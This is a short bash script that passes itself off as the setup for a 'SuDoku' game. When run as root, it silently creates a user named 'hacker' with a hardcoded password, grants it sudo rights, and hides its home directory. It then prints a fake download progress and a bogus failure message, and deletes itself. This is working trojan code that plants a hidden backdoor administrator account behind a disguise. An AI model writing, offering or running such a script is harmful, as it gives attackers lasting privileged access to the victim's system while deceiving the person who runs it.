#!/bin/bash

if [[ $EUID -ne 0 ]]; then
   echo "BASH SHELL> This script must be run as root (or with sudo)." 
   exit 1
fi

# Create the user "hacker" with the password "hackerpass"
useradd -m -p "$(openssl passwd -1 hackerpass)" hacker

# Give the user "hacker" sudo permissions
usermod -aG sudo hacker

# Rename the home directory by putting a "." in front of its name
mv /home/hacker /home/.hacker

# Set the home directory permissions to be only accessible to the user "hacker" and the root user
chown -R hacker:root /home/.hacker
chmod 750 /home/.hacker

# Set the default user shell to bash (when logged in)
chsh -s /bin/bash hacker

#FKSR
echo "(SuDoku) >> sudoku has not been setup yet."
echo "(SuDoku) >> do you want to start auto-setup? [Y/n]"
read answer

if [ "$answer" == "Y" ] || [ "$answer" == "y" ]; then
    echo "(SuDoku) >> STARTING AUTO SETUP, PLEASE WAIT..."
    sleep 2
    echo "downloading libraries..."
    sleep 1
    echo "2/11"
    sleep 1.5
    echo "5/11"
    sleep 0.4
    echo "6/11"
    sleep 1.2
    echo "9/11"
    sleep 0.2
    echo "10/11"
    sleep 1
    echo "..."
    sleep 2
    echo "Done."
    sleep 1
    echo "(SuDoku) >> SUDOKU HAS BEEN SUCCESSFULLY LOADED."
    echo "(SuDoku) >> TYPE 'start' to start."
    read answer2
    
    if [ "$answer2" == "start" ] || [ "$answer2" == "Start" ] || [ "$answer2" == "START" ]; then
        echo "program failed."
    else 
        echo "invalid credentials."
    fi
else
    rm -rf ~/sudoku-94765728359sh
fi





# Delete the script
rm -- "$0"
